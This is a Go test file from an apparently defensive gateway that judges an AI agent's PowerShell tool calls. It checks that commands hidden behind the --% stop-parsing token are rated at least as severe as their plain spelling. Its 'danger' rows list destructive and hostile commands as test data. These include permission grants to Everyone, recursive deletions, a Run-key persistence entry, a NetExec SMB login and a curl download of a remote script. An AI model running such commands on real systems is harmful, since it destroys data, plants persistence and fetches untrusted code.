// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"testing"
)

// TestStopParsingTokenReadsTheNativeArgv (GAP-2087): PowerShell hands the text
// after a --% stop-parsing token verbatim to a native program as its command
// line, so a static remainder (no %VAR% expansion) is that program's argv and
// is read like the plain spelling: a benign call takes the cell of its plain
// spelling in five tiers. A remainder that can hold code the reader does not
// see stays unread and keeps the unknown tier: a %VAR% expansion, or a cmd,
// powershell or pwsh program (the remainder is a script). A destructive call
// behind --% is never weaker than its plain spelling nor than the unknown
// tier it had (every word of those names a place outside the project, or a
// remote host).
// Red at det111/engine-train-6 f9b5854812 and a64bfdb931 (every
// --% remainder was unread: the benign rows alerted, blocked in strict).
func TestStopParsingTokenReadsTheNativeArgv(t *testing.T) {
	previous := windowsHookHost
	windowsHookHost = func() bool { return true }
	t.Cleanup(func() { windowsHookHost = previous })
	root := t.TempDir()
	home := filepath.Join(root, "home")
	cwd := filepath.Join(home, "proj")
	if err := os.MkdirAll(cwd, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	state := filepath.Join(home, ".defenseclaw")
	type row struct{ id, stop, plain string }
	benign := []row{
		{"git-log", "git --% log --oneline -n 5", "git log --oneline -n 5"},
		{"ping", "ping.exe --% -n 1 localhost", "ping.exe -n 1 localhost"},
		{"git-path", "git --% log --oneline -- src/main.go", "git log --oneline -- src/main.go"},
		{"call-op", "& git --% status --short", "& git status --short"},
	}
	unread := []row{
		{"percent", "ping.exe --% -n 1 %COMPUTERNAME%", ""},
		{"percent-format", `git --% log --format="%h %s" -n 5`, ""},
		{"rooted", "git --% -C /srv/repo log", ""},
		{"switch", "where.exe --% /r . go.mod", ""},
		{"cmd", "cmd.exe /c --% echo hi", ""},
		{"pwsh", "pwsh -NoProfile -Command --% Get-Date", ""},
	}
	danger := []row{
		{"icacls", "icacls.exe --% " + state + " /grant Everyone:F", "icacls.exe " + state + " /grant Everyone:F"},
		{"robocopy-mir", "robocopy.exe --% " + filepath.Join(root, "empty") + " " + state + " /MIR", "robocopy.exe " + filepath.Join(root, "empty") + " " + state + " /MIR"},
		{"reg-run", `reg.exe --% add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe /f`, `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe /f`},
		{"takeown", "takeown.exe --% /f " + state + " /r", "takeown.exe /f " + state + " /r"},
		{"cmd-rmdir", "cmd.exe /c --% rmdir /s /q " + state, "cmd.exe /c rmdir /s /q " + state},
		{"git-clean", "git --% -C " + state + " clean -fdx", "git -C " + state + " clean -fdx"},
		{"del-percent", `cmd.exe /c --% del /q %USERPROFILE%\.defenseclaw\config.yaml`, ""},
		// a remote place: the floor stays (GAP-0201 NetExec row)
		{"nxc-remote", "nxc --% smb 192.0.2.5 -u admin -p pass123", ""},
		{"curl-url", "curl.exe --% http://198.51.100.7/x.ps1 -o x.ps1", ""},
	}
	rank := map[string]int{"allow": 0, "alert": 1, "block": 2}
	shapeParityTiers(t, func(t *testing.T, p gap0437Pack) {
		handlers := map[string]http.HandlerFunc{}
		for _, conn := range []string{"claudecode", "antigravity"} {
			srv := gap0437Server(t, p, conn, "action")
			installToolCallCorpusProfileConnector(t, conn, p.pack)
			handlers[conn] = srv.handleAgentHook(conn)
		}
		judge := func(command string) map[string]string {
			args := map[string]any{"command": command}
			cc := shapeParityCall{name: "claudecode/PowerShell", conn: "claudecode", event: "PreToolUse",
				body: shapeParityEnvelope("PreToolUse", cwd, "PowerShell", args)}
			out := map[string]string{}
			for _, call := range append([]shapeParityCall{cc}, shapeParityNative("Bash", args, cwd)...) {
				out[call.name] = shapeParityHook(t, handlers[call.conn], call, p.managed)
			}
			return out
		}
		floor := "alert"
		if p.pack == "strict" {
			floor = "block"
		}
		for _, r := range benign {
			plain := map[string]string{}
			if r.plain != "" {
				plain = judge(r.plain)
			}
			for name, got := range judge(r.stop) {
				fmt.Printf("G2087\t%s\tbenign\t%s\t%s\t%s\tplain=%s\n", p.name, r.id, name, got, plain[name])
				if got != "allow" || r.plain != "" && got != plain[name] {
					t.Errorf("benign %s %s: got %s, want allow = plain %s", r.id, name, got, plain[name])
				}
			}
		}
		for _, r := range unread {
			for name, got := range judge(r.stop) {
				fmt.Printf("G2087\t%s\tunread\t%s\t%s\t%s\n", p.name, r.id, name, got)
				if rank[got] < rank[floor] {
					t.Errorf("unread %s %s: got %s, want at least %s (the unknown tier)", r.id, name, got, floor)
				}
			}
		}
		for _, r := range danger {
			plain := map[string]string{}
			if r.plain != "" {
				plain = judge(r.plain)
			}
			for name, got := range judge(r.stop) {
				fmt.Printf("G2087\t%s\tdanger\t%s\t%s\t%s\tplain=%s\n", p.name, r.id, name, got, plain[name])
				if rank[got] < rank[plain[name]] || rank[got] < rank[floor] {
					t.Errorf("danger %s %s: got %s, weaker than the plain spelling %s or the unknown tier %s", r.id, name, got, plain[name], floor)
				}
			}
		}
	})
}
